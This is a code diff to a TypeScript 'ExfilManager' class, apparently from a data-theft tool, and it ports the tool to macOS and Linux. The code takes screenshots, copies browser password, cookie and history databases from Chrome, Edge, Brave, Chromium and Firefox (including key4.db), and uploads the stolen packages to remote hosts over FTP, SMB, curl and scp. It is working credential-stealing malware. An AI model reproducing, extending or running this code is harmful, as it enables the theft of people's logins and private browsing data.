@@ -10,6 +10,8 @@ import * as path from 'path';
 import * as crypto from 'crypto';
 import * as zlib from 'zlib';
 import { EventEmitter } from 'events';
+import { execSync } from 'child_process';
+import { isWindows, isMac, isLinux, getScreenshotCommand, getScreenshotArgs, getBrowserDataPaths } from './platform';
 
 export type CompressionLevel = 'none' | 'fast' | 'max';
 export type EncryptionAlgo = 'aes-256-gcm' | 'chacha20' | 'xor' | 'none';
@@ -214,7 +216,8 @@ export class ExfilManager extends EventEmitter {
   }
 
   /**
-   * Take a screenshot (PowerShell on Windows)
+   * Take a screenshot (cross-platform)
+   * Windows: PowerShell | macOS: screencapture | Linux: scrot/import/gnome-screenshot
    */
   async takeScreenshot(jobId?: string): Promise<ExfilResult | null> {
     const screenshotDir = path.join(this.workDir, 'collected', 'screenshots');
@@ -224,21 +227,14 @@ export class ExfilManager extends EventEmitter {
     const outputPath = path.join(screenshotDir, filename);
 
     try {
-      const { execSync } = require('child_process');
-      // PowerShell one-liner for screenshot (Windows only)
-      const psScript = `
-        Add-Type -AssemblyName System.Windows.Forms;
-        Add-Type -AssemblyName System.Drawing;
-        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height;
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap);
-        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size);
-        $bitmap.Save('${outputPath.replace(/'/g, "''")}');
-        $graphics.Dispose();
-        $bitmap.Dispose();
-        Write-Host 'OK';
-      `;
-      execSync(`powershell -ExecutionPolicy Bypass -Command "${psScript}"`, { timeout: 15000 });
+      const cmd = getScreenshotCommand();
+      const args = getScreenshotArgs(outputPath);
+
+      if (isWindows()) {
+        execSync(`powershell -ExecutionPolicy Bypass -Command "${args.slice(2).join(' ')}"`, { timeout: 15000 });
+      } else {
+        execSync(`"${cmd}" ${args.join(' ')}`, { timeout: 15000 });
+      }
 
       if (fs.existsSync(outputPath)) {
         const stats = fs.statSync(outputPath);
@@ -272,44 +268,56 @@ export class ExfilManager extends EventEmitter {
   }
 
   /**
-   * Collect browser data (Chrome/Edge/Firefox history, cookies, passwords)
-   * Uses PowerShell to access Chrome/Edge SQLite databases
+   * Collect browser data (Chrome/Edge/Firefox/Brave/Chromium)
+   * Platform-aware paths: Windows LOCALAPPDATA, macOS ~/Library, Linux ~/.config
    */
   async collectBrowserData(jobId?: string): Promise<ExfilResult[]> {
     const browserDir = path.join(this.workDir, 'collected', 'browsers');
     if (!fs.existsSync(browserDir)) fs.mkdirSync(browserDir, { recursive: true });
 
     const results: ExfilResult[] = [];
-    const browsers = ['Chrome', 'Edge'];
+    const bp = getBrowserDataPaths();
+    const browserConfigs: { name: string; path: string | null; defaultDir: string; files: string[] }[] = [
+      { name: 'Chrome', path: bp.chrome, defaultDir: 'Default', files: ['Login Data', 'History', 'Cookies', 'Bookmarks'] },
+      { name: 'Edge', path: bp.edge, defaultDir: 'Default', files: ['Login Data', 'History', 'Cookies', 'Bookmarks'] },
+      { name: 'Brave', path: bp.brave || null, defaultDir: 'Default', files: ['Login Data', 'History', 'Cookies', 'Bookmarks'] },
+      { name: 'Chromium', path: (bp as any).chromium || null, defaultDir: 'Default', files: ['Login Data', 'History', 'Cookies', 'Bookmarks'] },
+    ];
 
-    for (const browser of browsers) {
-      const userDataDir = browser === 'Chrome'
-        ? `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data`
-        : `${process.env.LOCALAPPDATA}\\Microsoft\\Edge\\User Data`;
+    // Chromium-based browsers
+    for (const browser of browserConfigs) {
+      if (!browser.path || !fs.existsSync(browser.path)) continue;
+      const defaultDir = path.join(browser.path, browser.defaultDir);
+      if (!fs.existsSync(defaultDir)) continue;
+      for (const file of browser.files) {
+        const srcPath = path.join(defaultDir, file);
+        if (!fs.existsSync(srcPath)) continue;
+        try {
+          const safeName = file.replace(/[\s.]/g, '_');
+          const destPath = path.join(browserDir, `${browser.name}_${safeName}`);
+          fs.copyFileSync(srcPath, destPath);
+          const stats = fs.statSync(destPath);
+          const hash = crypto.createHash('sha256').update(fs.readFileSync(destPath)).digest('hex');
+          results.push({ path: destPath, size: stats.size, type: `browser/${browser.name.toLowerCase()}_${safeName}`, hash, timestamp: new Date().toISOString(), uploadProgress: 0, uploaded: false });
+        } catch { /* locked */ }
+      }
+    }
 
-      if (fs.existsSync(userDataDir)) {
-        // Copy Login Data, History, Cookies, Bookmarks
-        const filesToCollect = ['Login Data', 'History', 'Cookies', 'Bookmarks'];
-        for (const file of filesToCollect) {
-          const srcPath = path.join(userDataDir, 'Default', file);
-          if (fs.existsSync(srcPath)) {
-            try {
-              const destPath = path.join(browserDir, `${browser}_${file.replace(/\s/g, '_')}`);
-              fs.copyFileSync(srcPath, destPath);
-              const stats = fs.statSync(destPath);
-              const hash = crypto.createHash('sha256').update(fs.readFileSync(destPath)).digest('hex');
-
-              results.push({
-                path: destPath,
-                size: stats.size,
-                type: `browser/${file.toLowerCase().replace(/\s/g, '_')}`,
-                hash,
-                timestamp: new Date().toISOString(),
-                uploadProgress: 0,
-                uploaded: false,
-              });
-            } catch { /* file may be locked */ }
-          }
+    // Firefox (profile-based, same on all platforms)
+    if (bp.firefox && fs.existsSync(bp.firefox)) {
+      const profiles = fs.readdirSync(bp.firefox).filter(d => d.endsWith('.default') || d.endsWith('.default-release'));
+      for (const profile of profiles) {
+        const profileDir = path.join(bp.firefox, profile);
+        for (const file of ['logins.json', 'places.sqlite', 'cookies.sqlite', 'key4.db']) {
+          const srcPath = path.join(profileDir, file);
+          if (!fs.existsSync(srcPath)) continue;
+          try {
+            const destPath = path.join(browserDir, `Firefox_${profile}_${file.replace(/\./g, '_')}`);
+            fs.copyFileSync(srcPath, destPath);
+            const stats = fs.statSync(destPath);
+            const hash = crypto.createHash('sha256').update(fs.readFileSync(destPath)).digest('hex');
+            results.push({ path: destPath, size: stats.size, type: `browser/firefox_${file.replace(/\./g, '_')}`, hash, timestamp: new Date().toISOString(), uploadProgress: 0, uploaded: false });
+          } catch { /* locked */ }
         }
       }
     }
@@ -562,45 +570,53 @@ export class ExfilManager extends EventEmitter {
     }
 
     if (destination === 'ftp') {
-      // FTP upload using command-line ftp (Windows built-in)
       try {
-        const { execSync } = require('child_process');
-        const ftpScript = [
-          'open ' + destUrl.replace(/^ftp:\/\//, ''),
-          'binary',
-          'put ' + packagePath,
-          'bye',
-        ].join('\n');
-        const scriptPath = path.join(this.workDir, 'ftp_script.txt');
-        fs.writeFileSync(scriptPath, ftpScript);
-        execSync(`ftp -s:"${scriptPath}"`, { timeout: 60000 });
-        fs.unlinkSync(scriptPath);
+        if (isWindows()) {
+          const ftpScript = ['open ' + destUrl.replace(/^ftp:\/\//, ''), 'binary', 'put ' + packagePath, 'bye'].join('\n');
+          const scriptPath = path.join(this.workDir, 'ftp_script.txt');
+          fs.writeFileSync(scriptPath, ftpScript);
+          execSync(`ftp -s:"${scriptPath}"`, { timeout: 60000 });
+          fs.unlinkSync(scriptPath);
+        } else {
+          execSync(`curl -T "${packagePath}" "${destUrl}"`, { timeout: 60000, stdio: 'pipe' });
+        }
         for (const r of job.results) r.uploaded = true;
         this.emit('exfiltrated', { package: packagePath, success: true, destination: 'ftp' });
         this.saveJobs();
         return true;
-      } catch (err: any) {
-        this.emit('error', `FTP upload failed: ${err.message}`);
-        return false;
-      }
+      } catch (err: any) { this.emit('error', `FTP upload failed: ${err.message}`); return false; }
     }
 
     if (destination === 'smb') {
-      // SMB via net use + copy (Windows)
       try {
-        const { execSync } = require('child_process');
-        const sharePath = destUrl.replace(/^smb:\/\//, '\\\\').replace(/\//g, '\\');
-        execSync(`net use "${sharePath}" /persistent:no 2>nul`, { timeout: 15000 });
-        execSync(`copy "${packagePath}" "${sharePath}"`, { timeout: 60000 });
-        execSync(`net use "${sharePath}" /delete 2>nul`, { timeout: 5000 });
+        if (isWindows()) {
+          const sharePath = destUrl.replace(/^smb:\/\//, '\\\\').replace(/\//g, '\\');
+          execSync(`net use "${sharePath}" /persistent:no 2>nul`, { timeout: 15000 });
+          execSync(`copy "${packagePath}" "${sharePath}"`, { timeout: 60000 });
+          execSync(`net use "${sharePath}" /delete 2>nul`, { timeout: 5000 });
+        } else {
+          try {
+            const smbPath = destUrl.replace(/^smb:\/\//, '//');
+            execSync(`smbclient "${smbPath}" -c "put ${packagePath}"`, { timeout: 60000, stdio: 'pipe' });
+          } catch {
+            execSync(`scp "${packagePath}" "${destUrl}"`, { timeout: 60000, stdio: 'pipe' });
+          }
+        }
         for (const r of job.results) r.uploaded = true;
         this.emit('exfiltrated', { package: packagePath, success: true, destination: 'smb' });
         this.saveJobs();
         return true;
-      } catch (err: any) {
-        this.emit('error', `SMB upload failed: ${err.message}`);
-        return false;
-      }
+      } catch (err: any) { this.emit('error', `SMB upload failed: ${err.message}`); return false; }
+    }
+
+    if (destination === 'sftp' || destUrl.startsWith('sftp://') || destUrl.startsWith('scp://')) {
+      try {
+        execSync(`scp "${packagePath}" "${destUrl.replace(/^sftp:\/\//, '').replace(/^scp:\/\//, '')}"`, { timeout: 60000, stdio: 'pipe' });
+        for (const r of job.results) r.uploaded = true;
+        this.emit('exfiltrated', { package: packagePath, success: true, destination: 'sftp' });
+        this.saveJobs();
+        return true;
+      } catch (err: any) { this.emit('error', `SFTP upload failed: ${err.message}`); return false; }
     }
 
     return false;
